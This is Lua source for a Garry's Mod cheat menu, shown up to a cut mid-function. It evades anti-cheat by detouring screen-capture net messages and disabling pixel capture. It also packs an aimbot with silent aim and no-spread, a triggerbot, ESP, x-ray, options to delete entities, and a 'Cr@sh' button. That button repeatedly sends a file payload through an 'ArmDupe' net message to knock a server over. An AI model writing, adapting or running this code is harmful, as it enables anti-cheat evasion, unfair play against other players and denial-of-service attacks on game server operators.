function yeahboyosjeb()

    -- fuck you ji solutions
	hook.Remove( "RenderScreenspaceEffects", "JackyArmorSpaceEffects" )
	hook.Remove( "AdjustMouseSensitivity", "JackyArmorHindrance" )

    -- outfitter disabler
	if isfunction( DisableEverything ) then

		DisableEverything()

	end

	local netmsgs = {

		"gcap",
		"screencap",
		"capscreen",
		"rendercapture",
		"screengrab",
		"grabscreen",
		"NetData",
	}

	for i, _ in pairs( net.Receivers ) do

		for _, v in pairs( netmsgs ) do

			if string.find( i, v ) then

				net.Receive( i, function() chat.AddText( "net msg detoured: " .. v ) end )
				print( v .. " detoured" )

			end

		end
		
	end

	local sets = {}

	local think = {}
	local hudpaint = {}
	local createmove = {}

	local ohooks = {}

	local ofuncs = {}

	local friends = {}

	local binds = {}
	local bindsdebug = {}

	local dickwrap_e = false

	local debugmouse = false

	local me = LocalPlayer()

	local _R = debug.getregistry()
	local SetColor = _R.Entity.SetColor
	local GetColor = _R.Entity.GetColor
	local SetMaterial = _R.Entity.SetMaterial
	local GetMaterial = _R.Entity.GetMaterial
	local GetClass = _R.Entity.GetClass
	local GetRagdollEntity = _R.Player.GetRagdollEntity
	local SetNoDraw = _R.Entity.SetNoDraw
	local GetVelocity = _R.Entity.GetVelocity

	local concommand = table.Copy( concommand )
	local cvars = table.Copy( cvars )
	local debug = table.Copy( debug )
	local ents = table.Copy( ents )
	local file = table.Copy( file )
	local hook = table.Copy( hook )
	local math = table.Copy( math )
	local input = table.Copy( input )
	local spawnmenu = table.Copy( spawnmenu )
	local string = table.Copy( string )
	local surface = table.Copy( surface )
	local table = table.Copy( table )
	local timer = table.Copy( timer )
	local util = table.Copy( util )
	local vgui = table.Copy( vgui )

	local Angle = Angle
	local CreateClientConVar = CreateClientConVar
	local CurTime = CurTime
	local ErrorNoHalt = ErrorNoHalt
	local FrameTime = FrameTime
	local GetConVarString = GetConVarString
	local GetViewEntity = GetViewEntity
	local include = include
	local ipairs = ipairs
	local LocalPlayer = LocalPlayer
	local pairs = pairs
	local pcall = pcall
	local print = print
	local RunConsoleCommand = RunConsoleCommand
	local ScrH = ScrH
	local ScrW = ScrW
	local tonumber = tonumber
	local type = type
	local unpack = unpack
	local IsValid = IsValid
	local Vector = Vector

	ohooks.hudpaint = GAMEMODE.HUDPaint
	ohooks.think = GAMEMODE.Think
	ohooks.calcview = GAMEMODE.CalcView
	ohooks.createmove = GAMEMODE.CreateMove
	ohooks.drawphysgunbeam = GAMEMODE.DrawPhysgunBeam
	ohooks.predrawhalos = GAMEMODE.PreDrawHalos
	ohooks.renderscene = GAMEMODE.RenderScene
	ohooks.predrawviewmodel = GAMEMODE.PreDrawViewModel
	ohooks.predraweffects = GAMEMODE.PreDrawEffects
	ohooks.shoulddrawlocalplayer = GAMEMODE.ShouldDrawLocalPlayer
	ohooks.predrawplayerhands = GAMEMODE.PreDrawPlayerHands
	ohooks.postdrawviewmodel = GAMEMODE.PostDrawViewmodel
	ohooks.drawoverlay = GAMEMODE.DrawOverlay

	ofuncs.setviewangles = FindMetaTable( "CUserCmd" ).SetViewAngles
	ofuncs.clearbuttons = FindMetaTable( "CUserCmd" ).ClearButtons
	ofuncs.clearmovement = FindMetaTable( "CUserCmd" ).ClearMovement
	ofuncs.oldhookremove = hook.Remove
	ofuncs.onet = net
	ofuncs.filefind = file.Find
	ofuncs.fileread = file.Read
	ofuncs.fileexists = file.Exists

	local ropes = {
	    "particle/tinyfiresprites/tinyfiresprites",
	    "particle/water/watersplash_001a_additive",
	    "particle/antlion_goop3/antlion_goop3",
	    "vgui/gfx/vgui/solid_background",
	    "sprites/white",
	    "sprites/physcannon_bluecore1",
	    "pp/texturize",
	    "pp/colour",
	    "pp/toytown-top",
	    --VISABLE THROUGH WALLS--
		"sprites/physcannon_bluecore1",
		"pp/toytown-top",
		"sprites/autoaim_1a",
		"sprites/white",
		"vgui/gfx/vgui/cs_logo",
		"vgui/gfx/vgui/ak47",
		"vgui/gfx/vgui/m3",
		"vgui/gfx/vgui/p228",
		"vgui/gfx/vgui/m4a1",
		"vgui/gfx/vgui/gign",
		"vgui/gfx/vgui/glock",
		"vgui/gfx/vgui/ump45",
		"vgui/gfx/vgui/vip",
		"vgui/gfx/vgui/urban",
		"vgui/gfx/vgui/tmp",
		"vgui/gfx/vgui/t_random",
		"vgui/gfx/vgui/solid_background",
		"models/weapons/v_toolgun/screen_bg",
          --GLITCHY--
		"particle/tinyfiresprites/tinyfiresprites",
		"particle/water/watersplash_001a_additive",
		"particle/antlion_goop3/antlion_goop3",
		"sprites/orangelight1_noz",
		"effects/bonk",
		"effects/moon",
		"metal/ibeam001b",
		"metal/metalstair001a",
		"sprites/glow08",
		"sprites/dot",
		"trails/laser",
		"vgui/servers/icon_replay_column",
		"gm_construct/flatgrass",
		"dev/water_normal",
		"debug/env_cubemap_model",
		"decals/decalgraffiti010a",
		"models/hostages/sandro_facemap",
		"models/humans/male/group01/vance_facemap",
		"models/weapons/v_toolgun/screen_bg",
		"ajacks/billboard",
		"decals/decalgraffiti036a",
		"decals/decalgraffiti038a",
		"decals/decalgraffiti043a_cs",
		"decals/decalgraffiti062a",
		"cs_assault/assault_building_decal03",
		"decals/decalgraffiti058a_cs",
		"sprites/crosshairs",
		"decals/concrete/shot5Z",
		"icon16/page_red",
		"icon16/star",
		"models/cs_italy/lantern2a",
		"gui/info",
		"introscreen/main",
		"models/hostages/cohrt",
		"models/mossman/mossman_face",
		"gui/gmod_logo",
		"effects/ar2_altfire1",
		"models/player/shared/gold_player",
		"models/props/cs_assault/moneytop",
		"gui/colors",
		"materials/modernmotd/ico-dollar",
		"models/humans/nypd/badge",
		"effects/tool_tracer",
		"models/breen/mouth",
		"vgui/resource/icon_vac_new",
		"icon16/emoticon_smile",
		"games/16/all",
		"icon16/monkey",
		"icon16/shield"
	}

	sets[ "target" ] = nil
	sets[ "lastprop" ] = nil
	sets[ "currprop" ] = nil
	sets[ "rr" ] = false
	sets[ "physcolor" ] = me:GetWeaponColor()
	local aim_view = Angle()
	sets[ "spinnan" ] = Angle()
	sets[ "debug_spectator" ] = false
	sets[ "debugxray" ] = false
	sets[ "lastoption" ] = ""

	sets[ "aimbot" ] = {}
	sets[ "bhop" ] = {}
	sets[ "spam" ] = {}
	sets[ "render" ] = {}
	sets[ "exploits" ] = {}

	sets[ "aimbot" ][ "active" ] = true
	sets[ "aimbot" ][ "triggerbot" ] = true
	sets[ "aimbot" ][ "silent" ] = true
	sets[ "aimbot" ][ "bots" ] = true
	sets[ "aimbot" ][ "key2fire" ] = KEY_F
	sets[ "aimbot" ][ "autofire" ] = false
	sets[ "aimbot" ][ "nospread" ] = true

	sets[ "exploits" ][ "deleteweapons" ] = false
	sets[ "exploits" ][ "targetfriends" ] = true
	sets[ "exploits" ][ "deleteents" ] = false

	sets[ "bhop" ][ "active" ] = true

	sets[ "spam" ][ "rope" ] = true
	sets[ "spam" ][ "rapidfire" ] = true
	sets[ "spam" ][ "autopistol" ] = true
	sets[ "spam" ][ "spinbot" ] = false
	sets[ "spam" ][ "dance" ] = false

	sets[ "render" ][ "tracers" ] = true
	sets[ "render" ][ "halos" ] = true
	sets[ "render" ][ "dormant" ] = true
	sets[ "render" ][ "boxes" ] = false
	sets[ "render" ][ "bones" ] = false
	sets[ "render" ][ "xray" ] = true
	sets[ "render" ][ "thirdperson" ] = false
	sets[ "render" ][ "wireframe" ] = true
	sets[ "render" ][ "propcam" ] = true
	sets[ "render" ][ "tesp" ] = true
	sets[ "render" ][ "tname" ] = true
	sets[ "render" ][ "thp" ] = true
	sets[ "render" ][ "twep" ] = false
	sets[ "render" ][ "fullbright" ] = true
	sets[ "render" ][ "showtarget" ] = true
	sets[ "render" ][ "money" ] = true
	sets[ "render" ][ "fov" ] = 100
	sets[ "render" ][ "menucolor" ] = Color( 255, 0, 0 )
	sets[ "render" ][ "physoveride" ] = true
	sets[ "render" ][ "physcolor" ] = Vector( 1, 0, 1 )
	sets[ "render" ][ "wireframecolor" ] = Vector( 1, 0, 1 )

	surface.CreateFont( "deffOAN", { --thanks caliber
		font = "Tahoma", 
		size = 15, 
		weight = 700,
		antialias = false
	} )

	/*============================================
	File save check
	============================================*/

	if not file.Find( "crappens.txt", "DATA" ) then
		file.Write( "crappens.txt", util.TableToJSON( sets ) )
	end

	if isstring( file.Read( "crappens.txt", "DATA" ) ) then
		local filedata = util.JSONToTable( tostring( file.Read( "crappens.txt", "DATA" ) ) )

		for i, v in pairs( sets ) do
			if istable( v ) then
				for i2, v2 in pairs( v ) do
					if filedata[ i ][ i2 ] == nil then
						filedata[ i ][ i2 ] = v2
						MsgC( Color( 255, 255, 0 ), "Setting ", Color( 255, 155, 0 ), i2, Color( 255, 255, 0 ), " was nil, repaired.\n" )
					end
				end
			else
				if filedata[ i ] == nil then
					filedata[ i ] = v
					MsgC( Color( 255, 255, 0 ), "Setting " .. i .. " was nil, repaired.\n" )
				end
			end
		end

		file.Write( "crappens.txt", util.TableToJSON( filedata ) )
		sets = filedata
	else
		MsgC( Color( 255, 0, 0 ), "Error reading cheat settings.\n" )
	end

	/*============================================
	Dickwrap check
	============================================*/
	--[[
	if file.Exists( "cfg/bie/gmcl_dickwrap_win32.dll", "MOD" ) then
		require( "dickwrap" )
		dickwrap_e = true
	else
		MsgC( Color( 255, 0, 0 ), "No spread will not work without dickwrap.\n" )
	end
	--]]

	/*============================================
	Detours
	============================================*/

	FindMetaTable( "CUserCmd" ).SetViewAngles = function( cmd, ang ) 
		if debug.getinfo(2).short_src == "gamemodes/base/gamemode/player_class/taunt_camera.lua" then
			return
		end
		return ofuncs.setviewangles( cmd, ang )
	end

	FindMetaTable( "CUserCmd" ).ClearButtons = function( cmd )
	    
	    return

	end
	 
	FindMetaTable( "CUserCmd" ).ClearMovement = function( cmd )
	    
	    return

	end

	IsPlayingTaunt = function() return false end

	system.HasFocus = function() return false end
	render.CapturePixels = nil


	/*============================================
	Functions that will be used for the script
	============================================*/

	local function subVec( cone )
		return Vector( -cone, -cone, 0 )
	end

	local function getCone()
		if not sets[ "aimbot" ][ "nospread" ] then return subVec( 0 ) end

		local wep = me:GetActiveWeapon()

		if wep == nil then return subVec( 0 ) end
		
		if wep:GetClass() == "weapon_smg1" then
			return subVec( 0.04362 )
		end

		if wep:GetClass() == "weapon_ar2" then
			return subVec( 0.02618 )
		end

		if isstring( wep.Base ) then
			if wep.Base == "dm_weapon_base" then
				return subVec( wep.Primary.Spread or wep.Spread )
			end
			
			if wep.Base == "weapon_cs_base2" then
				return wep.Primary.Cone + .05
			end

			if wep.Base == "fas2_base" then
				local pang = ply:GetPunchAngle()
		    	math.randomseed( CurTime() )
				return subVec( pang )
			end

			if wep.Base and wep.Base == "weapon_base" then
				return subvec( wep.Primary.Cone / 90 )
			end

			if string.find( wep.Base, "lite_base" ) then
				local spread = wep.Primary.Cone

			    spread = spread + wep.Primary.Cone * math.Clamp( me:GetVelocity():Length2D() / me:GetRunSpeed(), 0, wep.Spread.VelocityMod )
			    spread = spread + wep:GetRecoil() * wep.Spread.RecoilMod
			 
			    if not me:IsOnGround() then
			        spread = spread * wep.Spread.AirMod
			    elseif me:Crouching() then
			        spread = spread * wep.Spread.CrouchMod
			    end
			 
			    if wep:GetIronsights() then
			        spread = spread * wep.Spread.IronsightsMod
			    end

				return subVec( math.Clamp( spread, wep.Spread.Min, wep.Spread.Max ) ) 
			end
		end
		
		if istable( wep.Primary ) then
			if isnumber( wep.Primary.IronAccuracy ) or isnumber( wep.Primary.Spread ) then
				if wep:GetIronsights() then
					return subVec( wep.Primary.IronAccuracy )
				else
					return subVec( wep.Primary.Spread )
				end
			end
		end
		
		return subVec( 0 )
	end

	local function getSpread( cmd, angle )
		local nangle = angle:Forward() or ( ( me:GetAimVector() ):Angle() ):Forward()
		return ( dickwrap.Predict( cmd, nangle, getCone() ) ):Angle()
	end

	local function addBind( key, action )
		if binds[ key ] then
			print( "bind for " .. tostring( key ) .. " already exists, overiding anyways." )
		end

		binds[ key ] = action
		bindsdebug[ key ] = false
	end

	local function fixMovement( cmd )
	    local vec = Vector( cmd:GetForwardMove(), cmd:GetSideMove(), 0 )
	    local vel = math.sqrt( vec.x*vec.x + vec.y*vec.y )
	    local mang = vec:Angle()
	    local yaw = cmd:GetViewAngles().y - aim_view.y + mang.y
	    if (((cmd:GetViewAngles().p+90)%360) > 180) then
	    yaw = 180 - yaw
	    end

	    yaw = ((yaw + 180)%360)-180;
	    cmd:SetForwardMove(math.cos(math.rad(yaw)) * vel)
	    cmd:SetSideMove(math.sin(math.rad(yaw)) * vel)
	end

	local function getFirePos( ent )
		local eyes = ent:LookupAttachment( "eyes" )

		if eyes ~= 0 then
			eyes = ent:GetAttachment( eyes )

			if eyes && eyes.Pos then
				local trace = util.TraceLine( {
					start = me:GetShootPos(),
					endpos = eyes.Pos,
					mask = 1174421507,
					filter = {me, ent}
				} )
	 
				if trace.Fraction == 1.0 then
					return eyes.Pos
				end
			end
		end

		local pos = ent:LocalToWorld( ent:OBBCenter() )
		local trace = util.TraceLine( {
			start = me:GetShootPos(),
			endpos = pos,
			mask = 1174421507,
			filter = {me, ent}
		} )

		if trace.Fraction == 1.0 then
			return pos
		end
	end

	local function normalizeAngle( ang )
	    ang.x = math.NormalizeAngle( ang.x )
	    ang.p = math.Clamp( ang.p, -89, 89 )

	    return ang
	end

	local function getWeapon( ent )
		local wep = ent:GetActiveWeapon()
		if ( wep:IsValid() ) then
			return wep
		else
			return false
		end
	end

	local function shouldFire( b )
		local wep = getWeapon( me )
		local camera = b && "gmod_camera" or ""
		local weps = {
			"weapon_physgun",
			"gmod_tool",
			camera,
			"h&&s",
			"none",
			"pocket",
			"inventory",
			"weapon_physcannon",
			"weapon_vape_"
		}

		if me:Alive() && wep then
			wep = wep:GetClass()
			for _, v in pairs( weps ) do
				if wep == v then return false end
			end
			return true
		end
		return false
	end

	local function clearnFire( cmd, key )
		cmd:SetViewAngles( aim_view )
		cmd:RemoveKey( key )

		cmd:SetButtons(cmd:GetButtons() + key )
	end

	function fixView( cmd )
		if sets[ "currprop" ] and input.IsKeyDown( KEY_E ) then return end
		if aim_view == Angle( 0, 0, 0 ) then aim_view = cmd:GetViewAngles() end

		aim_view = aim_view + Angle( cmd:GetMouseY() * .022, cmd:GetMouseX() * -.022, 0 )
		aim_view = normalizeAngle( aim_view )

		if cmd:CommandNumber() == 0 then
			cmd:SetViewAngles( aim_view )
			return
		end
	end

	local function getClosest()

		local ply = {}

		for _, v in pairs( player.GetAll() ) do

			if not v:Alive() or v == me or not getFirePos( v ) or friends[ v:SteamID() ] == true or v:IsDormant() or ( not sets[ "aimbot" ][ "bots" ] and v:IsBot() ) then continue end

			local pos = v:GetPos():ToScreen()
			local vec = ( Vector( pos.x, pos.y ) - Vector( ScrW() / 2, ScrH() / 2 ) ):Length2D()


			if isnumber( ply[ 2 ] ) and ply[ 2 ] < vec then continue end

			ply = { v, vec }

		end
		
		if #ply == 0 then return nil end

		return ply[ 1 ]

	end

	/*============================================
	Aimbot function
	============================================*/


	local function aimbot( cmd )
		if ( not cmd:CommandNumber() or not ( input.IsKeyDown( sets[ "aimbot" ][ "key2fire" ] ) or sets[ "aimbot" ][ "autofire" ] ) ) or ( not sets[ "aimbot" ][ "autofire" ] and vgui.GetKeyboardFocus() ~= nil ) or ( not sets[ "aimbot" ][ "autofire" ] and gui.IsConsoleVisible() ) or not shouldFire() or not me:GetActiveWeapon():IsValid() or not sets[ "aimbot" ][ "active" ] then sets[ "target" ] = nil return end

		local targ = getClosest()

		if not isentity( targ ) then sets[ "target" ] = nil return end

		sets[ "target" ] = targ

		local firepos = getFirePos( targ )

		if firepos == nil then return end

		local shootpos = ( me:GetShootPos() + me:GetVelocity() * engine.TickInterval() )
		local ang = (firepos - shootpos):Angle()
		
		if dickwrap_e then ang = getSpread( cmd, ang ) end

		if me:GetActiveWeapon().Base == "fas2_base" or me:GetActiveWeapon().Base == "cw_base" then ang = ang - me:GetPunchAngle() end

		ang = normalizeAngle( ang )
		cmd:SetViewAngles( ang )

		if sets[ "aimbot" ][ "silent" ] then
			fixMovement( cmd )
		else
			aim_view = ang
		end

		if sets[ "aimbot" ][ "triggerbot" ] then
			cmd:SetButtons( cmd:GetButtons() + 1 )
		end
	end

	/*============================================
	The main menu
	============================================*/

	local function mainmenu()
		local function checkbox( name, val, cat, parent, tooltip )
			local checkbox = vgui.Create( "DCheckBoxLabel", parent )
				checkbox:SetText( name )
				checkbox:SetTextColor( Color( 255, 255, 255 ) )
				checkbox:DockMargin( 0, 0, 0, 2 )
				checkbox:Dock( TOP )

				if isstring( cat ) then
					checkbox:SetChecked( sets[ cat ][ val ] )
				else
					checkbox:SetChecked( sets[ val ] )
				end

				if isstring( tooltip ) then
					checkbox:SetTooltip( tooltip )
				end

				function checkbox:OnChange()
					if isstring( cat ) then
						sets[ cat ][ val ] = self:GetChecked()
					else
						sets[ val ] = self:GetChecked()
					end

					file.Write( "crappens.txt", util.TableToJSON( sets ) )
				end
				function checkbox:PaintOver() 
					draw.RoundedBox( 0, 0, 0, 15, 15, Color( 0, 0, 0 ) )

					if checkbox:GetChecked() then
						draw.RoundedBox( 0, 4, 4, 7.5, 7.5, Color( 100, 0, 0 ) ) 
					end
				end
		end

		local function button( text, parent, x, y, x2, y2, func)
			local button = vgui.Create( "DButton", parent )
				button:SetPos( x, y )
				button:SetSize( x2, y2 )
				button:SetText( text )
				button.DoClick = func
				function button:Paint()
					draw.RoundedBox( 0, 0, 0, self:GetWide(), self:GetTall(), Color( 155, 155, 155 ) )
				end
		end

		local function paintButton( button, x, y, active )
			if active == button then
				surface.SetDrawColor( Color( 255, 155, 155 ) )
			else
				if button:IsHovered() then
					surface.SetDrawColor( Color( 155, 155, 155 ) )
				else
					surface.SetDrawColor( Color( 105, 105, 105 ) )
				end
			end

			surface.DrawRect( 0, 0, x, y )

		    surface.SetFont( "TargetID" )
		    surface.SetTextColor( Color( 255, 255, 255 ) )

		    local width, height = surface.GetTextSize( button:GetText() )
		    
		    surface.SetTextPos( x / 2 - ( width / 1.875), y / 2 - ( height / 1.875 ) )
		    surface.DrawText( button:GetText() )
		end

		local function paintListView( list )
			function list:Paint()
				surface.SetDrawColor( Color( 50, 50, 50 ) )
				surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
			end

			function list.VBar:Paint()
				surface.SetDrawColor( Color( 60, 60, 60 ) )
				surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
			end

			function list.VBar.btnGrip:Paint()
				surface.SetDrawColor( Color( 100, 50, 50 ) )
				surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )

				surface.SetDrawColor( Color( 200, 0, 0 ) )
			    surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
			end

			function list.VBar.btnUp:Paint()
				surface.SetDrawColor( Color( 100, 100, 100 ) )
				surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
			end

			function list.VBar.btnDown:Paint()
				surface.SetDrawColor( Color( 100, 100, 100 ) )
				surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
			end

			for _, v in pairs( list.Columns ) do
				function v.Header:Paint()
					surface.SetDrawColor( Color( 155, 105, 105 ) )
					surface.DrawRect( 2.5, 0, self:GetWide() - 5, self:GetTall() )
					self:SetTextColor( Color( 255, 255, 255 ) )
				end
			end
		end

		/*============================================
		Frame coloring and close button
		============================================*/

		local frame = vgui.Create( "DFrame" )
			frame:SetSize( 550, 350 )
			frame:Center()
			frame:MakePopup()
			frame:ShowCloseButton( false )
			frame:SetTitle( "" )
			function frame:Paint()
				draw.RoundedBoxEx( 5, 0, 0, self:GetWide(), 25, Color( 100, 50, 50 ), true, true )
				draw.RoundedBox( 0, 0, 25, self:GetWide(), self:GetTall() - 25, Color( 65, 65, 65 ) )
			end

		local cbutton = vgui.Create( "DButton", frame )
			cbutton:SetText( "" )
			cbutton:SetSize( 15, 15 )
			cbutton:SetPos( frame:GetWide() - cbutton:GetWide() - 5, 12.5 - ( cbutton:GetTall() - 7 ) )
			function cbutton:DoClick() 
				frame:Close()
			end
			function cbutton:Paint()
				draw.RoundedBox( 5, 0, 0, self:GetWide(), self:GetTall(), Color( 255, 0, 0 ) )
			end

		/*==========================================
		Tabs
		============================================*/
		
		local tabs = {}
			tabs["Rendering"] = vgui.Create( "DPanel", options )
			tabs["Bunny hop"] = vgui.Create( "DPanel", options )
			tabs["Aimbot"] = vgui.Create( "DPanel", options )
			tabs["Spam"] = vgui.Create( "DPanel", options )
			tabs["Hooking"] = vgui.Create( "DPanel", options )
			tabs["Friends"] = vgui.Create( "DPanel", options )
			tabs["Exploits"] = vgui.Create( "DPanel", options )
			tabs["Sliders"] = vgui.Create( "DPanel", options )

		local options = vgui.Create( "DColumnSheet", frame )
			options:Dock( FILL )

			function options:Paint()
				surface.SetDrawColor( Color( 50, 50, 50 ) )
			    surface.DrawRect( 0, 0, self:GetWide() ,self:GetTall() )
			end

		for i, v in pairs( tabs ) do
			v:Dock( FILL )
			options:AddSheet( i, v )

			v:DockPadding( 3, 3, 3, 3 )

			function v:Paint()
			    surface.SetDrawColor( Color( 50, 50, 50 ) )
			    surface.DrawRect( 0, 0, self:GetWide() ,self:GetTall() )
			    surface.SetDrawColor( Color( 255, 0, 0 ) )
			    surface.DrawOutlinedRect( 0, 0, self:GetWide(), self:GetTall() )
	    	end
		end

		for _, v in pairs( options.Navigation.pnlCanvas:GetChildren() ) do
			if v:GetText() == sets[ "lastoption" ] then
				options:SetActiveButton( v )
			end

			local doclick = v.DoClick

			function v:DoClick()
				doclick()
				sets[ "lastoption" ] = options:GetActiveButton():GetText()
			end

			function v:PaintOver()
			    paintButton( self, self:GetWide(), self:GetTall(), options.ActiveButton )
		   	end
		end

		local unload = vgui.Create( "DButton", frame )
			unload:SetSize( 100, 22 )
			unload:SetPos( 15, frame:GetTall() - 32 )
			unload:SetText( "Unload" )

			function unload:PaintOver()
				paintButton( self, self:GetWide(), self:GetTall() )
			end

			function unload:DoClick()
				GAMEMODE.HUDPaint = ohooks.hudpaint
				GAMEMODE.CreateMove = ohooks.createmove
				GAMEMODE.Think = ohooks.think
				GAMEMODE.DrawPhysgunBeam = ohooks.drawphysgunbeam
				GAMEMODE.RenderScene = ohooks.renderscene
				GAMEMODE.PostDrawViewmodel = ohooks.postdrawviewmodel
				GAMEMODE.PreDrawEffects = ohooks.predraweffects
				GAMEMODE.PreDrawHalos = ohooks.predrawhalos
				GAMEMODE.CalcView = ohooks.calcview
				GAMEMODE.PreDrawViewModel = ohooks.predrawviewmodel
				GAMEMODE.ShouldDrawLocalPlayer = ohooks.shoulddrawlocalplayer
				GAMEMODE.PreDrawPlayerHands = ohooks.predrawplayerhands

				frame:Close()
			end

			local armdupe = vgui.Create( "DButton", frame )
			armdupe:SetSize( 100, 22 )
			armdupe:SetPos( 15, frame:GetTall() - 60 )
			armdupe:SetText( "Cr@sh" )

			function armdupe:PaintOver()
				paintButton( self, self:GetWide(), self:GetTall() )
			end

			function armdupe:DoClick()

				GAMEMODE.Think = function()

					local _file = file.Open('NOOBESF.txt', 'rb', 'DATA'); 
					local payload = _file:Read(_file:Size())
					local length = payload:len()

					net.Start( "ArmDupe" )
					net.WriteUInt( length, 32 )
					net.WriteData( payload, length )
					net.SendToServer()

				end

				frame:Close()

			end

		/*============================================
		Menu options
		============================================*/

		checkbox( "Aimbot", "active", "aimbot", tabs[ "Aimbot" ] )
		checkbox( "Triggerbot", "triggerbot", "aimbot", tabs[ "Aimbot" ] )
		checkbox( "Silent", "silent", "aimbot", tabs[ "Aimbot" ] )
		checkbox( "No spread", "nospread", "aimbot", tabs[ "Aimbot" ] )
		checkbox( "Target bots", "bots", "aimbot", tabs[ "Aimbot" ] )
		checkbox( "Auto Fire", "autofire", "aimbot", tabs[ "Aimbot" ] )
		checkbox( "Spinbot", "spinbot", "spam", tabs[ "Spam" ] )
		checkbox( "Rapid fire", "rapidfire", "spam", tabs[ "Spam" ] )
		checkbox( "Auto pistol", "autopistol", "spam", tabs[ "Spam" ] )
		checkbox( "Dance", "dance", "spam", tabs[ "Spam" ] )
		checkbox( "Rope spam", "rope", "spam", tabs[ "Spam" ] )
		checkbox( "Bunny hop", "active", "bhop", tabs[ "Bunny hop" ] )

		checkbox( "Third person", "thirdperson", "render", tabs[ "Rendering" ] )
		checkbox( "Text ESP enabled", "tesp", "render", tabs[ "Rendering" ] )
		checkbox( "Text ESP health", "thp", "render", tabs[ "Rendering" ] )
		checkbox( "Text ESP weapon", "twep", "render", tabs[ "Rendering" ] )
		checkbox( "Text ESP name", "tname", "render", tabs[ "Rendering" ] )
		checkbox( "Prop camera", "propcam", "render", tabs[ "Rendering" ] )
		checkbox( "3D Boxes", "boxes", "render", tabs[ "Rendering" ] )
		checkbox( "Tracers", "tracers", "render", tabs[ "Rendering" ] )
		checkbox( "Halos", "halos", "render", tabs[ "Rendering" ] )
		checkbox( "Dormancy indicator", "dormant", "render", tabs[ "Rendering" ] )
		checkbox( "XRay", "xray", "render", tabs[ "Rendering" ] )
		checkbox( "Bones", "bones", "render", tabs[ "Rendering" ] )
		checkbox( "Full bright", "fullbright", "render", tabs[ "Rendering" ] )
		checkbox( "Show money", "money", "render", tabs[ "Rendering" ] )
		checkbox( "Wireframe", "wireframe", "render", tabs[ "Rendering" ] )
		checkbox( "No hands", "nohands", "render", tabs[ "Rendering" ] )
		
		checkbox( "Delete weapons", "deleteweapons", "exploits", tabs[ "Exploits" ] )
		checkbox( "Target friends", "targetfriends", "exploits", tabs[ "Exploits" ] )
		checkbox( "Delete entities", "deleteents", "exploits", tabs[ "Exploits" ] )

		/*============================================
		Hook list
		============================================*/

		local hooklist = vgui.Create( "DListView", tabs[ "Hooking" ] )
			hooklist:Dock( FILL )

			hooklist:AddColumn( "Type" )
			hooklist:AddColumn( "Name" )

			paintListView( hooklist )

			local function refreshHooks()
				hooklist:Clear()
				for htype, hooks in pairs( hook.GetTable() ) do

					if !istable(hooks) then continue end

					for hname, _ in pairs( hooks ) do
						htype = tostring( htype )
						hname = tostring( hname )

						hooklist:AddLine( htype, hname )
					end
				end

				for _, line in pairs( hooklist.Lines ) do
					function line:Paint()
						if line:IsHovered() then
							surface.SetDrawColor( Color( 100, 100, 100 ) )
						else
							surface.SetDrawColor( Color( 50, 50, 50 ) )
						end

						surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
					end

					for _, column in pairs( line.Columns ) do
						column:SetTextColor( Color( 255, 255, 255 ) )
					end
				end
			end

			function hooklist:OnRowSelected()
				for _, v in pairs( hooklist:GetSelected() ) do
					local htype = tostring( v:GetValue( 1 ) )
					local hname = tostring( v:GetValue( 2 ) )

					hook.Remove( htype, hname )
				end

				refreshHooks()
			end

			refreshHooks()
			
		/*============================================
		Friends list
		============================================*/

		local friendslist = vgui.Create( "DListView", tabs[ "Friends" ] )
			friendslist:Dock( FILL )
			friendslist:AddColumn( "Player" )
			friendslist:AddColumn( "Steam ID" )
			friendslist:AddColumn( "Is friend" )

			paintListView( friendslist )

			local function updateFriends()
				friendslist:Clear()

				for _, v in pairs( player.GetAll() ) do
					if v == me or v:IsBot() then continue end

					if friends[ v:SteamID() ] == true then
						friendslist:AddLine( v:Nick(), v:SteamID(), "true")
					else
						friendslist:AddLine( v:Nick(), v:SteamID(), "false")
					end
				end

				for _, line in pairs( friendslist.Lines ) do
					function line:Paint()
						if self:IsHovered() then
							surface.SetDrawColor( Color( 100, 100, 100 ) )
						else
							surface.SetDrawColor( Color( 50, 50, 50 ) )
						end

						surface.DrawRect( 0, 0, self:GetWide(), self:GetTall() )
					end

					for _, column in pairs( line.Columns ) do
						column:SetTextColor( Color( 255, 255, 255 ) )
					end
				end
			end

			updateFriends()

			function friendslist:OnRowSelected()
				local line = self:GetLine( self:GetSelectedLine() ):GetValue( 2 )

				friends[ line ] = not friends[ line ]

				updateFriends()
			end

		/*============================================
		Sliders
		============================================*/

		local phyrslider = vgui.Create( "DNumSlider", tabs[ "Sliders" ] )
			phyrslider:SetMin( 0 )
			phyrslider:SetMax( 1 )
			phyrslider:SetText( "Physgun red" )
			phyrslider:Dock( TOP )
			phyrslider:SetValue( sets[ "render" ][ "physcolor" ].x )
			function phyrslider:OnValueChanged( number )
				sets[ "render" ][ "physcolor" ].x = number
			end

		local phygslider = vgui.Create( "DNumSlider", tabs[ "Sliders" ] )
			phygslider:SetMin( 0 )
			phygslider:SetMax( 1 )
			phygslider:SetText( "Physgun green" )
			phygslider:Dock( TOP )
			phygslider:SetValue( sets[ "render" ][ "physcolor" ].y )
			function phygslider:OnValueChanged( number )
				sets[ "render" ][ "physcolor" ].y = number
			end

		local phybslider = vgui.Create( "DNumSlider", tabs[ "Sliders" ] )
			phybslider:SetMin( 0 )
			phybslider:SetMax( 1 )
			phybslider:SetText( "Physgun blue" )
			phybslider:Dock( TOP )
			phybslider:SetValue( sets[ "render" ][ "physcolor" ].z )
			function phybslider:OnValueChanged( number )
				sets[ "render" ][ "physcolor" ].z = number
			end


		local wfrslider = vgui.Create( "DNumSlider", tabs[ "Sliders" ] )
			wfrslider:SetMin( 0 )
			wfrslider:SetMax( 1 )
			wfrslider:SetText( "Wireframe red" )
			wfrslider:Dock( TOP )
			wfrslider:SetValue( sets[ "render" ][ "physcolor" ].x )
			function wfrslider:OnValueChanged( number )
				sets[ "render" ][ "wireframecolor" ].z = number
			end

		local wfgslider = vgui.Create( "DNumSlider", tabs[ "Sliders" ] )
			wfgslider:SetMin( 0 )
			wfgslider:SetMax( 1 )
			wfgslider:SetText( "Wireframe green" )
			wfgslider:Dock( TOP )
			wfgslider:SetValue( sets[ "render" ][ "physcolor" ].z )
			function wfgslider:OnValueChanged( number )
